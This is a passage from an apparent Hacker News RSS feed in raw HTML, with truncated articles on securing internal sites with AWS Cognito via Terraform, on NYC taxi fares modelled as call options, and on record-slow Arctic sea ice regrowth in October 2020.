</span><span>allowed_oauth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span>"code"</span><span>]</span><span></span></p><p><span>12</span><span>  </span><span>callback_urls</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>13</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>backend_alias</span><span>}</span><span>/oauth2/idpresponse"</span><span>,</span></p><p><span>14</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>frontend_alias</span><span>}</span><span>"</span><span>,</span></p><p><span>15</span><span>  </span><span>]</span><span></span></p><p><span>16</span><span>  </span><span>allowed_oauth_scopes</span><span>                 </span><span>=</span><span> </span><span>[</span><span>"email"</span><span>, </span><span>"openid"</span><span>]</span><span></span></p><p><span>17</span><span>  </span><span>allowed_oauth_flows_user_pool_client</span><span> </span><span>=</span><span> </span><span>true</span><span></span></p><p><span>18</span><span>  </span><span>supported_identity_providers</span><span>         </span><span>=</span><span> </span><span>[</span><span>"COGNITO"</span><span>]</span><span></span></p><p><span>19</span><span>  </span><span>explicit_auth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>20</span><span>    </span><span>"ALLOW_CUSTOM_AUTH"</span><span>,</span></p><p><span>21</span><span>    </span><span>"ALLOW_REFRESH_TOKEN_AUTH"</span><span>,</span></p><p><span>22</span><span>    </span><span>"ALLOW_USER_SRP_AUTH"</span><span>,</span></p><p><span>23</span><span>  </span><span>]</span><span></span></p><p><span>24</span><span></span><span>}</span></p></pre></div><p>In this example, we have not enabled an Identity Provider (IdP), so only username and password auth is accepted. If you want to enable an IdP like GSuite, you can add additional <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/Welcome.html">Cognito Identity Providers</a> quite easily.</p><p>To finalize our setup, let’s create a domain. This hosted UI for authentication needs to exist at some URL on the web, and Amazon lets you easily specify where you want your login page to live (either under the amazoncognito.com domain or on your own custom domain).
In this example, let’s make a subdomain for our login site at <a target="_blank" rel="noopener noreferrer" href="https://codelab-beyondcorp-alb.auth.us-east-1.amazoncognito.com/">https://codelab-beyondcorp-alb.auth.us-east-1.amazoncognito.com/</a>:</p><div><pre><p><span>1</span><span>resource </span><span>"aws_cognito_user_pool_domain"</span><span> </span><span>"domain"</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>domain</span><span>       </span><span>=</span><span> </span><span>"codelab-beyondcorp-alb"</span><span></span></p><p><span>3</span><span>  </span><span>user_pool_id</span><span> </span><span>=</span><span> aws_cognito_user_pool.pool.id</span></p><p><span>4</span><span></span><span>}</span></p></pre></div><h2 id="securing-a-backend">Securing a backend</h2><p>Now that we have a Cognito User Group, we can connect it to our backend applications. It’s relatively common for most backend routes to already have some sort of authentication, so you only need to add …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp">https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp</a></em></p>]]>
            </description>
            <link>https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp</link>
            <guid isPermaLink="false">hacker-news-small-sites-24901699</guid>
            <pubDate>Mon, 26 Oct 2020 21:30:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NYC taxi meter and options pricing]]>
            </title>
            <description>
<![CDATA[
Score 125 | Comments 55 (<a href="https://news.ycombinator.com/item?id=24901397">thread link</a>) | @bluestreak
<br/>
October 26, 2020 | https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders | <a href="https://web.archive.org/web/*/https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Every cab I have ever ridden has been complaining about how hard it is to make
ends meet as a driver. The public is generally quick to blame unfair competition
from the likes of Uber. However, additional forces are also to blame.</p><p>Going through more than 10 years worth of NYC taxi data, I analyse how the
antiquated meter system impacts the livelihood of NYC cabbies by drawing an
analogy with stock options trading. Interestingly, this approach allows us to
show that drivers have progressively been worse-off, independently of
competition from Uber.</p><p>In order to do so, we have loaded a dataset into our database QuestDB. This
dataset includes over 1.6 billion taxi rides, 700 million FHV rides (Uber, Lyft
etc), and 10 years of weather and gas prices data.</p><p>A few of months ago, I was putting together data for QuestDB's demo that we
shared on <a href="https://news.ycombinator.com/item?id=23616878" target="_blank" rel="noopener noreferrer">ShowHN</a>.</p><p>It has been a while since I left derivatives trading, and was not expecting to
end up writing about options pricing. Much to my surprise, the economics of a
taxi meter are very similar to options. This provides an interesting perspective
into the fate of taxi drivers.</p><h2>The economics of the taxi meter</h2><p>Most rides are priced using the
<a href="https://www1.nyc.gov/site/tlc/passengers/taxi-fare.page" target="_blank" rel="noopener noreferrer">standard meter system</a>.
The meter is a machine, which calculates the price of a ride based on inputs
such as time, speed, and distance. Additionally, it adds taxes, tolls and
surcharges depending on a variety of factors such as the route taken or the time
of the day.</p><p>Most of the driver's earnings come from the <code>fare</code>, which consists of a
<code>flat fare</code> $2.50 for entering the cab, and a <code>variable fare</code>. The variable
fare is a function of speed, time and distance. It is calculated as follows:</p><ul><li>When the cab drives above 12mph, $2.50 per mile</li><li>Otherwise, $0.50 per minute</li></ul><p>This post focuses on the variable fare, i.e the output of the meter excluding
the $2.50 start fee and extras. To be able to compare rides with one another,
we normalize it as an <code>hourly rate</code> of driving a customer around.</p><h2>Modelling variable earnings for taxi drivers</h2><p>Let's assume a cab is driving a customer at a constant speed during one hour. At
the end of the hour, the driver can expect to pocket <code>variable earnings</code> of:</p><ul><li>$30 if they drove below 12mph ($0.50 a minute)</li><li>$2.50 x their average speed if they drove above 12mph</li></ul><p>Let's plot the hourly earnings in function of speed. This instantly reminds me
of an old friend: call options!</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed.png"><p>Rewriting the fare formula as follows, we recognize the call option formula
<code>Max(0, S-K)</code>.</p><p><code>Hourly Fare = 30 + max(0, Speed - 12)</code></p><p>Interestingly, the above notation breaks down the hourly variable fare into two
components.</p><ul><li>A <code>guaranteed</code> component <code>30</code>: whenever driving a customer, a cab will make at
least $30 an hour.</li><li>An <code>optional</code> component <code>max(0, Speed - 12)</code>: driving customers faster earns
the driver more.</li></ul><p>Graphically, the breakdown between <code>guaranteed</code> and <code>optional</code> fare components
look like the below:</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed broken down between fixed and variable" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed-breakdown.png"><p>There is a reason for this system. It is designed to align the interests of
drivers and riders:</p><ul><li>The <code>guaranteed</code> part makes discourages riders from making the driver wait and
ensures they are paid for their time.</li><li>The <code>optional</code> part discourages drivers from purposefully taking customers
through traffic.</li></ul><p>Let's try to quantify the value of the optional part by using options pricing
methods in order to study the incentive for drivers.</p><h2>A simple approach to options pricing</h2><p>This post isn’t meant as an essay in financial mathematics (far from it).
However, before we continue, it is useful to understand what makes options
valuable. Buying an option is like paying to play a game with a monetary payout
contingent on some <code>variable</code>.</p><p>As an example, think of a dice game. If the die value (our variable) is below 2,
you receive 0. Otherwise, you receive the difference between that value and 2.
In financial markets, the threshold of 2 is known as the <code>strike price</code> and is
denoted K.</p><p><strong>You have to pay a fee to play this game. How much are you ready to pay?</strong></p><p>To find out, we need to calculate the expected value of a game. This is easy
since we know all <code>possible outcomes</code> and their
<code>respective probabilities of occurrence</code>. We can write these in the table below:</p><table><thead><tr><th>Dice value</th><th>Probability</th><th>Payout</th><th>Weighed payout</th></tr></thead><tbody><tr><td>1</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>2</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>3</td><td>16.66%</td><td>1</td><td>0.1666</td></tr><tr><td>4</td><td>16.66%</td><td>2</td><td>0.3332</td></tr><tr><td>5</td><td>16.66%</td><td>3</td><td>0.4998</td></tr><tr><td>6</td><td>16.66%</td><td>4</td><td>0.6664</td></tr></tbody></table><p>By summing all the potential payouts weighed by their probability, we compute
the expected value of playing this game: $1.4494.</p><ul><li>If we pay less to play the game, we will make money over time.</li><li>If we pay more, we lose in the long run.</li></ul><p>This example shows that in its simplest form, the value of an option is equal to
the product of the payout profile and the associated probability distribution
when the option expires. Let’s visualize this by plotting the values for our
game in the following chart:</p><img alt="A chart showing the outcome profile of the dice game and the corresponding probabilities and probability-weighed expected payout values" src="https://questdb.io/img/blog/2020-10-16/die-game-payout-profile.png"><p>where:</p><ul><li>The white dashed line represents the possible (discrete) payouts for the game.</li><li>The cyan dotted line is the probability for each outcome (dice value) to
occur. It is a straight line at 16.66% since each of the 6 values is
equiprobable.</li><li>The coloured area is the product of the first two lines. Its total surface is
the value of our option.</li></ul><p>Of course, this is very simplified. I omit time value, which is the idea that
you (almost) always wish you could hold the option for longer. The reason time
value exists has to do with the asymmetric payoff profile: there is more to win
than to lose by waiting a little longer. Also, in real life, outcomes are rarely
equiprobable. For example, stock prices are represented as a log-normal
distribution. Nevertheless, this example gives a good introduction to calculate
the value of an option.</p><p>Now, since we saw that speed is the main driver behind the variable fare, we
should attempt to build a representation of speed distribution in order to
estimate the option value.</p><h2>Modelling cabs speed and option value</h2><p>This can be done using a log-normal distribution, which is analogous to the
normal distribution, but cannot be negative. This fits our situation well since
cabs can only drive above 0mph.</p><p>The log-normal distribution requires two parameters:</p><ul><li>the <code>mean</code>, i.e a driver's expected average speed for a given hour.</li><li>the <code>standard deviation</code>, a measure of how much the achieved speed is likely
to deviate from the mean.</li></ul><p>If we overlay the log-normal distribution to the option payoff, we can see the
option value below as the product of the two surface areas. As you can see, the
log-normal distribution is skewed to the left and the mode (the highest point on
the distribution, at around 10 mph) is lower than the mean (13 mph in the
above).</p><img alt="A chart of call option payoff with the corresponding probability and weighed value area as overlay" src="https://questdb.io/img/blog/2020-10-16/option-payoff-probability-value.png"><p>We can play with our two parameters to get a grasp on the pricing dynamics. Here
is how the average speed changes the distribution and expected option value:</p><img alt="A chart showing how distribution of outcomes and value change with the expected mean" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-avg.png"><p>And here is the effect of standard deviation:</p><img alt="A chart showing how distribution of outcomes and value change with the standard deviation" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-stdev.png"><p>We can see that a higher mean and a higher standard deviation result in higher
option value. In short, this means that it is in the drivers' best interests to</p><ul><li>drive faster;</li><li>deviate for the mean, for example by taking risks.</li></ul><p>Now, to be clear, I don't mean that they should drive recklessly, but rather
that they should attempt "risky" routes, which could either save a lot of time,
or otherwise be a disaster.</p><p>In traditional finance, the sensitivities to input parameters, which we have
introduced above are called the “Greeks”. These are measures of risk named
(mostly) after Greek letters. They are used to evaluate and manage the risk of
options portfolios. Here are the two greeks respective to the mean and standard
deviation:</p><ul><li>The <code>delta</code>, change of option value relative to change of the mean</li><li>The <code>vega</code>, change of value relative to the change of standard deviation (aka
volatility).</li></ul><p>These are "first order" greeks, which means they directly affect the option
value. There are more greeks, of higher order, which affect the option value
indirectly. As example, the <code>vanna</code> is a second-order greek which measures how
much the delta (first order greek) of an option changes when volatility changes.</p><h2>Traffic increase has cost a great amount to taxi drivers</h2><p>Let’s first look at the average speed over time.</p><p>The NYC taxi dataset gives us the distance calculated by the meter, the pickup
timestamp, and the drop-off timestamp. Using QuestDB, we can derive the duration
of each ride as the difference between the two timestamps and divide the
distance by the duration, to calculate the average speed.</p><p>With <code>SAMPLE BY</code>, I compute the average results for monthly intervals and plot
it below. Over 10 years, the average speed dropped significantly from 13.3 to
9.7mph (almost 30%!).</p><img alt="A chart showing the evolution of the average cab driver speed over time and how it consistently dropped below the threshold" src="https://questdb.io/img/blog/2020-10-16/average-speed-over-time.png"><p>This number is a simplification since it assumes constant speed and no idle
time. However, it is useful to calculate a lower-bound for earnings as follows.</p><p><code>Min Hourly Variable Fare = Max($30, Avg(speed) * $2.5)</code></p><p>Similarly, we can estimate the upper bound of a driver’s hourly earnings in a
theoretical world where drivers are either idle or accelerate instantly from 0
to the speed limit of 25mph. This is how the maximum potential fare could be
calculated:</p><p><code>Max potential hourly variable fare = Distance component + Idle component</code></p><p><code>Distance component = Average ride distance * $2.50 / Average ride duration (hours)</code></p><p>and</p><p><code>Idle component = (25 - Average ride distance)/25mph * 60min * $0.50</code></p><p>Lastly, we can calculate the actual average variable fare over time as follows.</p><p><code>Actual Hourly Variable Fare =avg(fare_amount - $2.50) / avg(duration_hours) </code></p><p>Here is what the three metrics look like over time (note we started the plot in
September 2012 since cab prices were increased in August 2012. Interestingly,
the average minimum variable fare has dropped over time and is now hitting a
floor.</p><img alt="A chart showing the evolution of the average cab driver potential fare range against the actual average fare" src="https://questdb.io/img/blog/2020-10-16/potential-average-fare-range.png"><p>Now that we have the average speed, we can use the standard deviation to model
the speed distribution. By feeding the historical mean and standard deviations
into a log-normal distribution model, we can compute the following percentiles.
For the vast majority of rides, drivers can expect to average below 12mph.</p><img alt="A chart showing the evolution of the distribution of NYC cab drivers' average speed over time" src="https://questdb.io/img/blog/2020-10-16/distribution-speed-over-time.png"><p>To sum up, the following chart shows how the economics have changed over time.
We can see how this damaged the option value for drivers, mostly as a …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders">https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders</a></em></p>]]>
            </description>
            <link>https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders</link>
            <guid isPermaLink="false">hacker-news-small-sites-24901397</guid>
            <pubDate>Mon, 26 Oct 2020 21:06:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Arctic Sea Ice not freezing In October – first time since measurements began]]>
            </title>
            <description>
<![CDATA[
Score 131 | Comments 66 (<a href="https://news.ycombinator.com/item?id=24900778">thread link</a>) | @clumsysmurf
<br/>
October 26, 2020 | https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/ | <a href="https://web.archive.org/web/*/https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><strong>Arctic sea ice melt season usually lasts from March till September. After reaching the minimum extent in September, sea ice starts to grow back in October. But this year, the growth is much slower than last year, with almost no growth in some places. How did this unusual situation happen and can it mean something for the weather towards Winter 2020/2021?</strong><br>
&nbsp;</p>
<h5><span><strong>THE ARCTIC ICE GROWTH</strong></span></h5>
<p>The Arctic sea ice seasonal cycle can be seen in the image below from the Arctic-ROOS system. It shows the Arctic sea ice extent change over a year. The melt season usually starts in March, after the peak ice extent is reached, lasting all the way to September. The graph shows the last few years of data, where we can see the 2020 Arctic ice extent was second-lowest, only behind 2012, which still holds the record for the lowest ice extent since measurements began.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png" data-image-id="20130" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png-nggid0520130-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png-nggid0520130-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>But comparing 2012 and 2020, we can see that this year we are also setting a new record, as the Arctic sea ice is not recovering as expected. The sea ice is refreezing back, but at a much slower rate than normal, meaning that some areas are severely falling behind.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png" data-image-id="20131" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png-nggid0520131-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png-nggid0520131-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>That is even more evident when we look at the comparison of all the years since the active satellite observations began in 1979. This year we observed the second-lowest Arctic sea ice extent on record. But because of the unusually low ice growth in October, the current ice extent is now the lowest for any October in the past 41 years.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg" data-image-id="20158" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg-nggid0520158-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpeg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg-nggid0520158-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpeg">
</a>
</p>
<p>Comparing the minimum extent dates for the past 17 years also shows the 2020 minimum to be second lowest, trailing only the grand minimum of 2012. Graphic provided by <a href="https://sites.uci.edu/zlabe/graduate-research/">Zachary Labe</a>.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png" data-image-id="20142" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png-nggid0520142-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png-nggid0520142-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Comparing the years by the current date, we are well the lowest for this time of year. That is also evident by the second image, which shows the sea ice anomaly, compared to the long-term average. It shows the 2020 (red area) ice extent anomaly to continue to increase, while in the previous years (white lines), the anomaly already started to decrease by this point.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png" data-image-id="20129" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png-nggid0520129-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png-nggid0520129-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>

<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png" data-image-id="20155" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png-nggid0520155-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png-nggid0520155-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>The analysis image by the National Snow and Ice Data Center (NSIDC) below, shows the current ice concentration and the average/normal long term extent in orange lines. Those orange lines show how far the sea ice should be reaching at this point in time, revealing a huge ice deficit.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png" data-image-id="20170" data-title="arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png-nggid0520170-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe" title="arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe" width="588" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20588%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png-nggid0520170-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Growth has obviously begun since mid-September, but the rate was rather weak and is not increasing with time, evident by the recent daily increase rate on the image below. At this point, the daily growth should slowly increase over time, but we can see the daily growth area is not increasing and has rather been almost decreasing over time. The second image shows the October growth compared to previous years, where 2020 is severely trailing behind</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png" data-image-id="20135" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png-nggid0520135-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png-nggid0520135-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png" data-image-id="20159" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png-nggid0520159-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png-nggid0520159-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Images below show the current sea ice extent and thickness. We can see that the thickness shows a larger area than the concentration. That is because the concentration shows only the sea ice above 15% concentration. Anything below that means the ice is just too fractured and not compact enough.</p>
<p>So the sea ice thickness image reveals that there is thinner uncompacted ice around the edges, which falls below the 15% concentration threshold. This is usually normal because new sea ice is just starting to form on the edges and takes time to get more compact. But this year the ice is not compacting so fast, and we are now going to look at what is behind this unusual event.</p>
